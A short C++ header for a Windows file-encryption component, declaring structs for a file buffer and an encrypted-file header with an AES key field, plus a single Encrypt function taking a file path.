#pragma once

#include <iostream>
#include <windows.h>
#include <wincrypt.h>
#include <conio.h>


namespace cryptor
{
	typedef struct 
	{
		HANDLE hFile1;
		BYTE* buffer;
		DWORD dwFileSize;
	} encryptComponent;


	typedef struct 
	{
		BYTE magic[256];
		DWORD AESkeySize;
		BYTE AESencryptedData[256];
		DWORD originalFileSize;
	}encryptHeader;


	void Encrypt(BYTE filePath[MAX_PATH]);
}
